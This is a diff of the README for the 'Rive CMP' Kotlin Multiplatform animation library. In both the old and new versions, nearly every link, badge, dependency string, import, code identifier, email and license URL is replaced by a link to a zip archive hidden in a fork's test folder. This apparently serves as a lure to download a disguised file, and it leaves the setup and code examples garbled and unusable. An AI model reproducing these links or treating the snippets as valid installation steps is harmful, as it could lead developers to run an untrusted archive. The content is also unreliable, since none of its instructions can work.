@@ -1,16 +1,16 @@
 # Rive CMP
 
-![Maven Central Version](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip)
-[![API](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip%https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip)](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip)
-[![Kotlin Multiplatform](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip)](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip)
-[![License](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip%https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip)](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip)
-<img alt="Platform Android" src="https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip"/>
-<img alt="Platform iOS" src="https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip"/>
+![Maven Central Version](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
+[![API](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip%https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
+[![Kotlin Multiplatform](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
+[![License](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip%https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
+<img alt="Platform Android" src="https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip"/>
+<img alt="Platform iOS" src="https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip"/>
 
 A Compose Multiplatform wrapper library for integrating Rive animations, providing a unified API to
 use rive-android and rive-ios seamlessly across Android and iOS platforms.
 
-<img src="https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip" alt="Rive CMP Banner"></img>
+<img src="https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip" alt="Rive CMP Banner"></img>
 
 > **⚠️ EXPERIMENTAL STATUS**
 >
@@ -19,7 +19,7 @@ use rive-android and rive-ios seamlessly across Android and iOS platforms.
 > applications.
 >
 > **Current Limitations:**
-> - ~~On iOS, `UIKitView` does not support transparent backgrounds, resulting in opaque backgrounds for Rive animations. This is a known limitation in Compose Multiplatform. See [Issue #17](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip) for details and potential workarounds.~~ Fixed in [#42](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip).
+> - ~~On iOS, `UIKitView` does not support transparent backgrounds, resulting in opaque backgrounds for Rive animations. This is a known limitation in Compose Multiplatform. See [Issue #17](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for details and potential workarounds.~~ Fixed in [#42](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip).
 > - Not all features and properties from the native Rive libraries are supported yet
 > - Some advanced Rive features may not be available across all platforms
 
@@ -38,18 +38,18 @@ use rive-android and rive-ios seamlessly across Android and iOS platforms.
 
 | Platform | Implementation        | Dependency                |
 |----------|-----------------------|---------------------------|
-| Android  | Native rive-android   | `https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip` |
+| Android  | Native rive-android   | `https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip` |
 | iOS      | Swift Package Manager | `rive-ios` via spm4kmp    |
 
 ## Installation
 
 ### Gradle (Kotlin Multiplatform)
 
-Add the dependency to your `https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip`:
+Add the dependency to your `https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip`:
 
 ```kotlin
-https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip {
-    implementation("https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip")
+https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip {
+    implementation("https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip")
 }
 ```
 
@@ -57,20 +57,20 @@ https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMa
 
 ```kotlin
 dependencies {
-    implementation("https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip")
+    implementation("https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip")
 }
 ```
 
 ### Version Catalog
 
-Add to your `https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip`:
+Add to your `https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip`:
 
 ```toml
 [versions]
 rive-cmp = "0.1.1"
 
 [libraries]
-rive-cmp = { module = "https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip", https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip = "rive-cmp" }
+rive-cmp = { module = "https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip", https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip = "rive-cmp" }
 ```
 
 ## Android Initialization
@@ -85,11 +85,11 @@ Add this to your app's manifest file:
 
 ```xml
 
-<provider android:name="https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip"
+<provider android:name="https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip"
     android:authorities="${applicationId}.androidx-startup" android:exported="false"
     tools:node="merge">
-    <meta-data android:name="https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip"
-        android:value="https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip" />
+    <meta-data android:name="https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip"
+        android:value="https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip" />
 </provider>
 ```
 
@@ -101,8 +101,8 @@ Add this to your app's manifest file:
 Call the initializer in your application code:
 
 ```kotlin
-https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip(applicationContext)
-    .initializeComponent(https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip)
+https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(applicationContext)
+    .initializeComponent(https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
 ```
 
 </details>
@@ -113,7 +113,7 @@ https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMa
 Initialize Rive yourself in your code:
 
 ```kotlin
-https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip(context)
+https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(context)
 ```
 
 </details>
@@ -125,7 +125,7 @@ rive-ios dependency to your Xcode project:
 
 1. In Xcode, go to File > Add Package Dependencies...
 
-2. Enter the package URL: https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip
+2. Enter the package URL: https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
 
 3. Select version 6.11.1 (exact match to the library's dependency).
 
@@ -137,7 +137,7 @@ This resolves linking issues with the Rive runtime on iOS.
 
 Alternatively, for advanced users, the library generates a local Swift package at
 `library/SPM/spmKmpPlugin/nativeIosShared`. You can add this local package to your Xcode project if
-you have the source cloned. See [spm4kmp documentation](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip) for
+you have the source cloned. See [spm4kmp documentation](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for
 details.
 
 Note: The library uses spm4kmp to integrate rive-ios, but manual addition may be required in some
@@ -148,15 +148,15 @@ setups.
 ### Direct Animation Loading
 
 ```kotlin
-import https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip
-import https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip
+import https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
+import https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
 
 @OptIn(ExperimentalRiveCmpApi::class)
 @Composable
 fun MyScreen() {
     CustomRiveAnimation(
-        modifier = https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip(https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip),
-        url = "https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip"
+        modifier = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip),
+        url = "https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip"
     )
 }
 ```
@@ -164,32 +164,32 @@ fun MyScreen() {
 ### Composition-based Loading (Recommended)
 
 ```kotlin
-import https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip
-import https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip
-import https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip
-import https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip
+import https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
+import https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
+import https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
+import https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
 
 @OptIn(ExperimentalRiveCmpApi::class)
 @Composable
 fun MyScreen() {
     // URL-based composition
     val urlAnimation by rememberRiveComposition {
-        https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip("https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip")
+        https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip("https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip")
     }
 
     // Resource-based composition
     val resourceAnimation by rememberRiveComposition {
-        https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip(https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip("https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip"))
+        https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip("https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip"))
     }
 
     Column {
         CustomRiveAnimation(
-            modifier = https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip(https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip),
+            modifier = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip),
             composition = urlAnimation
         )
 
         CustomRiveAnimation(
-            modifier = https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip(https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip),
+            modifier = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip),
             composition = resourceAnimation
         )
     }
@@ -206,10 +206,10 @@ fun MyScreen() {
 fun CustomRiveAnimation(
     modifier: Modifier = Modifier,
     url: String,
-    alignment: RiveAlignment = https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip,
+    alignment: RiveAlignment = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip,
     autoPlay: Boolean = true,
     artboardName: String? = null,
-    fit: RiveFit = https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip,
+    fit: RiveFit = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip,
     stateMachineName: String? = null,
 )
 ```
@@ -222,10 +222,10 @@ fun CustomRiveAnimation(
 fun CustomRiveAnimation(
     modifier: Modifier = Modifier,
     byteArray: ByteArray,
-    alignment: RiveAlignment = https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip,
+    alignment: RiveAlignment = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip,
     autoPlay: Boolean = true,
     artboardName: String? = null,
-    fit: RiveFit = https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip,
+    fit: RiveFit = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip,
     stateMachineName: String? = null,
 )
 ```
@@ -238,10 +238,10 @@ fun CustomRiveAnimation(
 fun CustomRiveAnimation(
     modifier: Modifier = Modifier,
     composition: RiveComposition?,
-    alignment: RiveAlignment = https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip,
+    alignment: RiveAlignment = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip,
     autoPlay: Boolean = true,
     artboardName: String? = null,
-    fit: RiveFit = https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip,
+    fit: RiveFit = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip,
     stateMachineName: String? = null,
 )
 ```
@@ -250,10 +250,10 @@ fun CustomRiveAnimation(
 
 ```kotlin
 // Create URL-based composition spec
-https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip(url: String): RiveCompositionSpec
+https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(url: String): RiveCompositionSpec
 
 // Create ByteArray-based composition spec  
-https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip(byteArray: ByteArray): RiveCompositionSpec
+https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(byteArray: ByteArray): RiveCompositionSpec
 ```
 
 ### rememberRiveComposition
@@ -273,10 +273,10 @@ fun rememberRiveComposition(
 - `byteArray`: ByteArray containing the Rive animation data (direct loading)
 - `composition`: Pre-loaded `RiveComposition` from `rememberRiveComposition` (recommended)
 - `alignment`: How the animation should be aligned within its container (default:
-  `https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip`)
+  `https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip`)
 - `autoPlay`: Whether the animation should start playing automatically (default: `true`)
 - `artboardName`: Optional name of the specific artboard to use
-- `fit`: How the animation should fit within its container (default: `https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip`)
+- `fit`: How the animation should fit within its container (default: `https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip`)
 - `stateMachineName`: Optional name of the state machine to use
 
 ## Requirements
@@ -339,7 +339,7 @@ Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at
 
-    https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip
+    https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
@@ -352,15 +352,15 @@ limitations under the License.
 
 **Muaz KADAN**
 
-- Website: [https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip)
-- Email: https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip
-- GitHub: [@muazkadan](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip)
+- Website: [https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
+- Email: https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
+- GitHub: [@muazkadan](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
 
 ## Acknowledgments
 
-- [Rive](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip) for the amazing animation platform
-- [rive-android](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip) for Android implementation
-- [rive-ios](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip) for iOS implementation
-- [spm4kmp](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip) for Swift Package Manager integration
-- [Snizzors](https://raw.githubusercontent.com/namanmalik04/Rive-CMP/main/sample/src/commonMain/test/kotlin/dev/muazkadan/CMP-Rive-v3.9.zip) for enabling transparent UIViews in
+- [Rive](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for the amazing animation platform
+- [rive-android](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for Android implementation
+- [rive-ios](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for iOS implementation
+- [spm4kmp](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for Swift Package Manager integration
+- [Snizzors](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for enabling transparent UIViews in
   Compose Multiplatform
